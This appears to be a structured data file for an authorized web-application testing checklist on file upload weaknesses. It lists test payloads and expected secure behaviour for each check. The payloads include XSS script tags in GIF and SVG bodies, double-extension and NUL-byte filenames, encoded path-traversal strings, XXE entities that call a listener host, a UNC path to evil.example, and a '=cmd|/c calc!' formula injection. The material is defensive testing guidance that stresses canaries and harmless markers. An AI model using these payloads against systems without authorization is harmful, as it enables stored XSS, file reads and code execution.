title: File upload
summary: Extension vs magic, executable content, SVG, filename traversal, download IDOR, ZIP Slip, and XXE in uploaded XML.

groups.title: What the server accepts
groups.summary: Type, name, and whether the file later executes or scripts.

checks.title: Extension, Content-Type, and magic
checks.why: The server trusts one of the three and ignores the others.
checks.validate: A file that should be rejected is stored and later served or processed as that type.

variants.name: GIF magic, HTML name
variants.payload:
Filename: note.html
Content-Type: image/gif
Body: GIF89a
<script>alert(1)</script>
variants.expect: If stored and served as HTML, that is stored XSS. Repeat with .svg, .xml, .pdf.
variants.why: The server must agree on extension, Content-Type, and magic bytes; a mismatch is the gap.

variants.name: Double extension
variants.payload:
note.php.jpg
note.jpg.php
note.phtml
note.aspx
note.jsp
note.html.jpg
variants.expect: Normalization must run before the allowlist. A stored .php on an executable origin is critical.
variants.why: Legacy servers execute the last known extension, bypassing an extension allowlist.

variants.name: NUL and trailing dot
variants.payload:
note.php%00.jpg
note.php.
note.php::$DATA
note.PHP
variants.expect: Legacy IIS/PHP tricks. Confirm the stored name, not only the upload response.
variants.why: Trailing dots, spaces, and NUL bytes are normalised differently by the OS and the validator.

checks.title: Uploaded file executes
checks.why: The upload directory is inside an executable origin, or the app includes the file as code.
checks.validate: Requesting the stored URL runs server-side code or is served as active HTML from the app origin.

variants.name: Harmless marker script
variants.payload: <?php echo 'WAPT-UPLOAD-MARKER'; ?>\n<% Response.Write("WAPT-UPLOAD-MARKER") %>
variants.expect: Use a print-only marker, never a shell. If the URL prints the marker, stop and record.
variants.why: A benign script file confirms execution without a destructive payload.

variants.name: Served as HTML
variants.payload:
GET /uploads/<id>/note.html HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: Content-Type must not be text/html on the app origin. Isolated file origin or attachment is the secure case.
variants.why: A user-controlled body served as text/html on the app origin is stored-XSS-grade.

checks.title: SVG / active content
checks.why: A user SVG is served inline from the app origin and runs script in the victim's session.
checks.validate: Opening the file URL as a document executes script in the application origin.

variants.name: SVG with script
variants.payload:
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <script>alert(1)</script>
</svg>
variants.expect: Upload as image.svg. Open the URL in the browser (not as ). Inline script on the app origin is the finding.
variants.why: SVG is XML plus script, so a stored SVG is a stored-XSS vector.

variants.name: Content-Disposition
variants.payload:
GET /uploads/<id>/image.svg HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: attachment plus a non-HTML type, or a separate files origin, removes impact. nosniff should be set.
variants.why: Attachment Content-Disposition is the control that stops SVG/HTML being rendered in-line.

checks.title: Filename path traversal
checks.why: The stored path joins the user filename onto a directory without canonicalizing.
checks.validate: The file lands outside the upload directory. On production use a canary path, not /etc/passwd.

variants.name: Dot-dot filename
variants.payload: filename: ../../wapt-canary.txt
variants.expect: The stored object must stay inside the upload root. Also try ..%2f and ....//.
variants.why: A ../ filename writes outside the upload root if the path is not sanitised.

variants.name: Absolute and UNC
variants.payload: filename: /var/www/wapt-canary.txt\nfilename: \\evil.example\share\wapt.txt
variants.expect: Absolute and UNC names must be rejected or stripped to the basename.
variants.why: Absolute and UNC paths are resolved by the storage layer, not the validator.

groups.title: Download, archives, XML
groups.summary: Who can fetch the object, ZIP Slip, and XXE in uploaded documents.

checks.title: Download authorization
checks.why: A guessed or swapped file id returns another user's object.
checks.validate: Account A retrieves B's file. Confirm the body, not only a 200.

variants.name: Swap the file id
variants.payload:
GET /files/2002 HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>
variants.expect: 2002 belongs to B. Also /api/v1/files/2002 and /download?id=2002.
variants.why: Reading another user's file by id is download authorization failure.

variants.name: Signed URL reuse
variants.payload:
GET /files/2002?token=<expired-or-A-token> HTTP/1.1
Host: files.example.com
Connection: close
variants.expect: A signed URL must die after expiry and must not authorize a different object id.
variants.why: A signed URL that outlives its grant or is reusable off-account bypasses the check.

checks.title: Download path traversal
checks.why: The download handler joins a user path onto a document root.
checks.validate: A traversal reads a file outside the intended directory. On production use a canary you placed.

variants.name: Dot-dot on download
variants.payload:
GET /download?file=../../wapt-canary.txt HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>
variants.expect: The canary is returned. Stop after one confirmed read. Also try %2e%2e%2f.
variants.why: A traversal in the download path reads files outside the intended directory.

variants.name: Double-encoded
variants.payload:
GET /files/..%252f..%252fwapt-canary.txt HTTP/1.1
Host: www.example.com
Cookie: session=<account-A>
variants.expect: Edge decodes once, origin decodes again.
variants.why: Two decode layers can resurrect a traversal after the first check.

checks.title: ZIP Slip / archive extract
checks.why: An uploaded archive is extracted and an entry name walks out of the extract root.
checks.validate: A canary file you own is written or overwritten outside the extract directory. Do not overwrite system files.

variants.name: Traversal entry name
variants.payload: zipinfo style entry: ../../wapt-canary.txt\nAlso: ..\\..\\wapt-canary.txt
variants.expect: Build a tiny zip with that entry name and a harmless marker body. Extract must refuse or stay inside the root.
variants.why: A zip entry named ../ escapes the extraction root if entry names are not canonicalised.

variants.name: Symlink entry
variants.payload: A symlink entry pointing at /tmp/wapt-canary.txt or a file you own.
variants.expect: Must be refused. Do not point a symlink at /etc/passwd on a shared host.
variants.why: A symlink entry can point extraction at arbitrary paths the extractor will follow.

checks.title: XXE in uploaded XML / Office / SVG
checks.why: A parser that accepts the upload resolves external entities.
checks.validate: A callback on a host you control is fetched, or a canary file you placed is returned. Never harvest /etc/passwd on production.

variants.name: Classic external entity
variants.payload:
<?xml version="1.0"?>
<!DOCTYPE wapt [
  <!ENTITY xxe SYSTEM "https://unique.oast.example/xxe">
]>
<root>&xxe;</root>
variants.expect: Upload as .xml / .svg / .docx (word/document.xml). An outbound hit on your listener is the finding.
variants.why: An external entity in uploaded XML triggers an out-of-band read to your listener.

variants.name: Parameter entity / DTD
variants.payload:
<?xml version="1.0"?>
<!DOCTYPE wapt [
  <!ENTITY % dtd SYSTEM "https://unique.oast.example/xxe.dtd">
  %dtd;
]>
variants.expect: Same listener check. Disable external DTD loading is the control.
variants.why: Parameter entities and DTDs bypass naive entity filters in some parsers.

checks.title: File acceptance and delivery contract documented
checks.why: Every upload finding is a contract violation — the contract (types, sizes, delivery, processing) must exist before testing.
checks.validate: A written per-surface contract: accepted types, max sizes, storage/delivery origin, transformations, and who may read what.

variants.name: Contract capture
variants.payload: From docs, UI hints, and owner confirmation, write the contract per upload surface (avatar, import, attachment, export).
variants.expect: Owner-confirmed contract; each later check cites the clause it tests.
variants.why: No contract, no findings — just opinions.

variants.name: Surface census
variants.payload: Enumerate every upload and download path (UI, API, importers, drag-drop, paste handlers, email-in).
variants.expect: All surfaces listed with owners; forgotten surfaces are the findings.
variants.why: Uploads arrive by more doors than the UI shows.

variants.name: Delivery mapping
variants.payload: For each surface, record where files are served from (same origin, subdomain, CDN, signed URL) and processing applied.
variants.expect: Delivery path documented; isolation decisions visible (feeds the isolation check).
variants.why: Where it lands decides how dangerous it is.

checks.title: Filenames normalized before extension checks
checks.why: shell.php;.jpg, trailing dots/spaces, Unicode lookalikes, and double extensions fool naive extension logic.
checks.validate: Filenames normalized (NFC, trimmed, case-folded) before allowlist checks; extension taken from the final segment only.

variants.name: Extension roulette
variants.payload: Upload your canary file as shell.php.jpg, shell.jpg.php, shell.PHP, shell.php;, shell.php%00.jpg, "shell .php".
variants.expect: Only genuinely allowed extensions accepted regardless of casing, padding, or double dots.
variants.why: One upload each, all yours, all decisive.

variants.name: Unicode lookalikes
variants.payload: Extensions with homoglyphs (е vs e) and right-to-left marks in names.
variants.expect: Normalized before checks; no lookalike bypasses.
variants.why: Normalization is the fix; test its presence.

variants.name: Stored-name review
variants.payload: Inspect the stored/served filename after a legitimate upload.
variants.expect: Server-generated or sanitized names; original name kept only as metadata.
variants.why: The stored name is the served risk.

checks.title: Untrusted files on an isolated origin
checks.why: User files served same-origin mean stored XSS by upload; isolation (dedicated domain, headers, sandbox) contains execution.
checks.validate: User-content delivery is origin-isolated or hardened (sandbox, CSP, nosniff, attachment) so uploads cannot execute against the app.

variants.name: Upload-then-navigate
variants.payload: Upload an HTML/SVG canary file; navigate directly to its URL.
variants.expect: Served from isolated origin or forced download / strict CSP — never executable same-origin.
variants.why: The single most important upload test.

variants.name: Header hardening audit
variants.payload: Check delivery headers on the file: CSP, nosniff, Content-Disposition, CORP.
variants.expect: Defense stack present and coherent on the delivery origin.
variants.why: Headers are the isolation contract.

variants.name: Cookie scope crossover
variants.payload: Check whether app cookies scope onto the delivery origin.
variants.expect: No session cookies on untrusted origins; domain scoping reviewed.
variants.why: Isolation fails if cookies bridge it.

checks.title: Upload overwrite and collision prevented
checks.why: Predictable storage names let one user overwrite another object — defacement or code swap on shared paths.
checks.validate: Storage names are unique (random ids) and writes verify ownership; no user-controlled path segments.

variants.name: Same-name overwrite
variants.payload: Upload two files with identical names; then attempt re-upload over a path containing another user object.
variants.expect: Each upload gets unique storage; overwrite attempts fail ownership checks.
variants.why: Names are not identifiers.

variants.name: Path segment injection
variants.payload: Filenames containing ../, ..\, url-encoded slashes, and absolute paths (/tmp/x, C:\x).
variants.expect: Rejected or flattened; no traversal into other directories (feeds traversal checks).
variants.why: Names become paths somewhere — find where.

variants.name: Id-vs-name mismatch
variants.payload: Access a file by its friendly name path vs its id; attempt the friendly path of another user file.
variants.expect: Only id-based, authorized access works.
variants.why: Friendly paths are usually the unguarded twin.

checks.title: Archive symlinks rejected at extraction
checks.why: A tar/zip entry that is a symlink to /etc/passwd or app code turns extraction into arbitrary read/write.
checks.validate: Archive extraction rejects symlinks/hardlinks outside the target, absolute paths, and device entries.

variants.name: Symlink escape archive
variants.payload: Craft (with tar/zip tools) an archive whose entry links to /etc/hostname and ../../app/config; upload to the extract feature.
variants.expect: Extraction refuses link entries or confines them; no file outside the sandbox touched.
variants.why: The classic zip-slip sibling — build it in one command.

variants.name: Absolute-path entry
variants.payload: Archive entry named /tmp/pwned or C:\\temp\\pwned.
variants.expect: Absolute entry paths rejected before extraction.
variants.why: Path handling is security at extraction time.

variants.name: Extraction log review
variants.payload: Owner-assisted: check server logs/behavior for the extraction of your crafted archive (no external reads attempted).
variants.expect: Refusals logged; extraction sandbox documented.
variants.why: Confirm the boundary held server-side.

checks.title: Archive expansion bounded before extraction
checks.why: A 10KB zip that expands to 100GB kills disk and memory before any scanner runs — bounds must precede extraction.
checks.validate: Entry count, total uncompressed size, and compression ratio are checked before extraction; hard limits enforced.

variants.name: Ratio bomb (small)
variants.payload: A zip with highly compressible entries (zeros) sized to expand a few hundred MB max — bounded by your authorization.
variants.expect: Refused at declared size limits before extraction; clear error.
variants.why: Small enough to be safe, big enough to prove.

variants.name: Entry-count flood
variants.payload: Archive with tens of thousands of tiny entries.
variants.expect: Entry-count limit enforced before per-entry work.
variants.why: Inodes are the resource nobody caps.

variants.name: Nested-archive note
variants.payload: Zip-inside-zip chains to depth where supported.
variants.expect: Nested extraction bounded (depth/total budget).
variants.why: Recursion multiplies everything.

checks.title: Upload size and per-user quotas enforced
checks.why: Per-request limits without per-user quotas let one account fill storage — cost and denial for everyone.
checks.validate: Per-file and cumulative per-user limits enforced server-side with clear errors.

variants.name: Oversize single
variants.payload: Upload just above the documented max.
variants.expect: Rejected before processing with a clear error; no partial temp files left (check via timing/errors).
variants.why: The basic bound, tested at its edge.

variants.name: Quota walk
variants.payload: Upload valid small files until the documented quota (bounded effort, or owner-assisted reset).
variants.expect: Quota enforced cumulatively with a clear message; eviction policy documented.
variants.why: Cumulative is the part teams forget.

variants.name: Temp-file hygiene
variants.payload: After rejection/failure cases, retry the same upload; observe behavior.
variants.expect: Failed uploads leave no zombie temp files or quota ghosts.
variants.why: Garbage accumulates in failure paths.

checks.title: Decoded image dimensions bounded
checks.why: A tiny PNG declaring 30000x30000 decodes into gigabytes of pixels — decompression bombs live in dimensions, not file size.
checks.validate: Decoded pixel dimensions capped before processing; oversized metadata rejected.

variants.name: Dimension bomb
variants.payload: Craft a PNG/JPEG (ImageMagick/python) declaring extreme dimensions with small file size; upload for thumbnails/previews.
variants.expect: Rejected on decoded dimensions before pixel work; error, not hang.
variants.why: One command builds it; one request decides it.

variants.name: Metadata monsters
variants.payload: Files with huge EXIF/XMP chunks and comment floods.
variants.expect: Metadata size capped; stripped before processing.
variants.why: Parsers read metadata before pixels.

variants.name: Format confusion
variants.payload: A file whose magic bytes disagree with its extension and Content-Type.
variants.expect: Type detected server-side (magic bytes), not trusted from client.
variants.why: Client-declared type is advice, not truth.

checks.title: Images and documents normalized before use
checks.why: Re-processing (thumbnails, preview, OCR) feeds raw originals into parsers — normalization closes parser-differential surface.
checks.validate: Uploads are transcoded/normalized before downstream processing; originals never reach parsers directly.

variants.name: Polyglot into preview
variants.payload: Upload a JPEG/PHP or GIF/JS polyglot through the thumbnail/preview pipeline.
variants.expect: Normalization strips the foreign tail; preview contains only re-encoded image data.
variants.why: The pipeline is the attack surface, not the file.

variants.name: SVG sanitization
variants.payload: Upload an SVG containing script, foreignObject, and event handlers; view the preview.
variants.expect: SVG sanitized (script removed) or served inert (feeds isolation check).
variants.why: SVG is HTML with superpowers.

variants.name: Original-access check
variants.payload: Determine whether raw originals remain reachable after processing.
variants.expect: Originals not served for inline rendering; processed versions only.
variants.why: Keep originals, do not render them.

checks.title: Polyglot files handled per every reachable parser
checks.why: The same bytes hit the browser (as HTML), the preview service (as image), and the backend (as archive) — each must be safe.
checks.validate: Each polyglot-reachable parser treats the file safely; no parser-executable path from user content.

variants.name: Parser reach map
variants.payload: For one uploaded file, list every consumer: browser delivery, preview, antivirus, search indexer, export.
variants.expect: Map documented; each consumer judged in its own parser.
variants.why: Three parsers, three verdicts, one file.

variants.name: Browser-side polyglot
variants.payload: Craft content that sniffs as HTML in browsers (leading <!doctype) with a valid image extension; navigate to its URL.
variants.expect: nosniff + correct type + isolation stop browser execution.
variants.why: The browser is the easiest parser to attack.

variants.name: Backend polyglot
variants.payload: Archive/document polyglots through import pipelines (owner-approved test paths).
variants.expect: Import treats input strictly as the declared format; errors are clean.
variants.why: Backends trust magic bytes at their peril.

checks.title: Malware scanning as depth, not type validation
checks.why: Scanners catch malware, not attacks — EICAR proves the pipeline runs; type/authorization logic must stand alone.
checks.validate: Scanning is present, asynchronous-safe, and never the only control; EICAR is caught, type checks pass without it.

variants.name: EICAR pipeline test
variants.payload: Upload the EICAR test string file (harmless industry-standard test content).
variants.expect: Detected, quarantined, and reported per policy — pipeline proven live.
variants.why: The safe, standard way to prove AV runs.

variants.name: Scan-bypass shape
variants.payload: EICAR inside a zip, split across entries, or with altered (still-inert) formatting.
variants.expect: Detection robust to trivial obfuscation; note bypass shapes honestly.
variants.why: Scanners see what scanners see.

variants.name: Window-of-availability
variants.payload: Upload a benign file then EICAR immediately; observe when each becomes downloadable.
variants.expect: Nothing served before scan verdict (or documented async policy with quarantine).
variants.why: Async scanning has a serving gap.

checks.title: Upload creation and attachment targets authorized
checks.why: Attaching uploads to foreign objects (other accounts, tenants, tasks) smuggles content into contexts you do not own.
checks.validate: Upload creation and every attachment/re-reference is authorized against the target object.

variants.name: Foreign attachment
variants.payload: Upload as A; attach it to a B-owned container (message, task, ticket) via id.
variants.expect: Attachment refused — target authorization, not just upload permission.
variants.why: The upload was legal; the attach is the attack.

variants.name: Cross-tenant upload
variants.payload: Upload into tenant-1 storage referencing tenant-2 paths/ids.
variants.expect: Tenant boundaries enforced on storage targets.
variants.why: Storage inherits tenancy.

variants.name: Orphan-adoption
variants.payload: Reference an unattached/deleted file id from your earlier upload in a new context.
variants.expect: Orphans are not adoptable; ids re-validate per use.
variants.why: Zombie files live in id lists.

checks.title: Encoded traversal variants rejected consistently
checks.why: One decoder in the chain (web server, framework, storage SDK) and ../ comes back to life.
checks.validate: Traversal rejected in every encoding: plain, %2e%2e, double-encoded, over-long UTF-8, semicolon, backslash.

variants.name: Encoding ladder
variants.payload: Download/serve paths with ../, ..%2f, %2e%2e/, ..%252f, ..;/, ..\\, ....// (each its own request).
variants.expect: All variants rejected uniformly; no 200 with content outside the root.
variants.why: The ladder finds the forgotten decoder.

variants.name: Absolute-path forms
variants.payload: Filenames resolving to /etc/hostname and C:\\windows\\win.ini style targets.
variants.expect: Absolute paths rejected.
variants.why: Absolute is just another escape.

variants.name: Response-diff proof
variants.payload: Compare a valid file response with each traversal attempt.
variants.expect: No leaked foreign content; document statuses for the report.
variants.why: Evidence is the diff, not the guess.

checks.title: Local file inclusion via include/template paths
checks.why: Template or include paths influenced by request data render server files (config, source) or execute uploaded ones.
checks.validate: Include/template paths come from a static allowlist; request data never selects filesystem paths.

variants.name: Path parameter hunt
variants.payload: Parameters like template=, page=, lang=, theme=, file= that look like path fragments; try path values and traversal.
variants.expect: Paths resolve only against a static map; unknown keys rejected.
variants.why: Every path-shaped parameter is a candidate.

variants.name: Extension ladder
variants.payload: Append extensions (.html, .tpl, .php) to reachable include values per stack.
variants.expect: No source disclosure, no execution; extension handling fixed.
variants.why: Null bytes are gone; suffix rules remain.

variants.name: Uploaded-template chain
variants.payload: If uploads are includable (via traversal or template params), chain upload→include (canary content only).
variants.expect: Uploads never land in executable/include paths; chain broken.
variants.why: The two findings that combine into RCE.

checks.title: Remote inclusion and untrusted template loading
checks.why: Loading templates/code from URLs or user content means the attacker ships the payload and the server executes it.
checks.validate: No remote sources for templates/includes; template engines run untrusted content in non-executing modes.

variants.name: URL parameter probe
variants.payload: Template/include parameters given https:// URLs (your Collaborator/test host).
variants.expect: Remote sources refused; no outbound fetch occurs (watch Collaborator).
variants.why: The fetch itself is the finding.

variants.name: SSTI canary
variants.payload: In any field rendered through a template engine, inject engine-neutral markers ({{7*7}}, ${7*7}, <%= 7*7 %>) with your own account.
variants.expect: No evaluation — output shows the literal text; any arithmetic result is SSTI.
variants.why: Canary math, not payloads.

variants.name: User-content-as-template
variants.payload: Determine whether stored user content is ever rendered as a template (mail merge, document generation).
variants.expect: Untrusted content rendered as data with auto-escaping; generation contexts sandboxed.
variants.why: The mail-merge feature is the classic RCE.

checks.title: Download filenames encoded safely
checks.why: User filenames in Content-Disposition break headers or deceive users (evil.html.exe, RTL overrides).
checks.validate: Content-Disposition filenames RFC-encoded (filename*), header-safe, and deceptive characters neutralized.

variants.name: Header-breaking names
variants.payload: Filenames with CR/LF, quotes, and semicolons (your own upload).
variants.expect: Well-formed header; no splitting; neutralized output.
variants.why: The response-splitting test in its modern home.

variants.name: Deceptive names
variants.payload: RTL override + .exe, trailing spaces before extension, double extensions.
variants.expect: Served names neutralized; UI shows true extension.
variants.why: Social engineering in one attribute.

variants.name: Unicode round-trip
variants.payload: Emoji and CJK filenames across browsers (your files).
variants.expect: filename* encoding correct; falls back safely.
variants.why: International users exist; encodings must too.

checks.title: Temporary and quarantined files inaccessible
checks.why: Pending scans, failed imports, and temp renders sit outside normal authorization — but on reachable URLs.
checks.validate: Temp/quarantine storage is not web-served, or requires the same authorization as final files; names unguessable.

variants.name: Temp URL hunt
variants.payload: During processing (slow scan/import if triggerable), capture any temp URL from responses or storage paths; request it directly.
variants.expect: Temp artifacts not directly reachable or fully authorized.
variants.why: The window between upload and finalize.

variants.name: Predictable temp names
variants.payload: Check temp naming (timestamps, original name, sequential) via your own uploads.
variants.expect: Random names; predictability documented if present.
variants.why: Guessable + unguarded = enumeration.

variants.name: Quarantine access
variants.payload: Where AV quarantines files, attempt to fetch a quarantined file URL.
variants.expect: Quarantine is not a delivery path.
variants.why: Quarantined means contained, not published.

checks.title: Unsafe preview in privileged tools prevented
checks.why: Previews rendered inside admin/analyst sessions execute in the most privileged context in the product.
checks.validate: Document/archive previews render in isolated contexts (sandboxed origin/iframe, conversion service), never in privileged UI directly.

variants.name: Preview execution probe
variants.payload: Upload content that would execute on preview (script in SVG/HTML-ish document); open the preview as an admin-capable test account.
variants.expect: No execution in the privileged context; isolation verified by origin inspection.
variants.why: The admin preview window is the crown context.

variants.name: Office macro shape
variants.payload: Documents with auto-open behaviors (owner-approved inert samples) through the preview pipeline.
variants.expect: Conversion sandbox strips active content; no macro execution paths.
variants.why: Preview = conversion = parser exposure.

variants.name: Converter escape
variants.payload: Check preview service for known CVE-class parser bugs relevant to its stack (version-appropriate, read-only probes).
variants.expect: Patching posture verified; converter isolation documented.
variants.why: The converter is internet-facing infrastructure.

checks.title: Generated files validated before publish/email
checks.why: Exports and generated documents (PDFs, reports, spreadsheets) inherit user content — formula injection and stored XSS via generation.
checks.validate: Generated outputs are validated/neutralized (formula prefixes, embedded content) before delivery to any viewer.

variants.name: CSV formula injection
variants.payload: Profile fields set to =cmd|/c calc! and +HYPERLINK shapes (your own account); export CSV; open in a sandboxed spreadsheet.
variants.expect: Formulas neutralized (=, +, -, @ prefixed or stripped); no execution on open.
variants.why: The classic export flaw, still everywhere.

variants.name: HTML-in-PDF reflection
variants.payload: User content rendered into PDF exports; inject content designed to escape into PDF-link/JS features.
variants.expect: Generator escapes content; no active PDF features from user data.
variants.why: PDF engines have their own script stories.

variants.name: Mail-merge injection
variants.payload: Generated emails containing user content; inject headers/redirects shapes into fields.
variants.expect: Emails well-formed; no header or body structure injection.
variants.why: Generated output is still an output.

svg-script.purpose: SVG is XML plus script, so a stored SVG is a stored-XSS vector.

upload-dotdot.purpose: A ../ filename writes outside the upload root if the path is not sanitised.
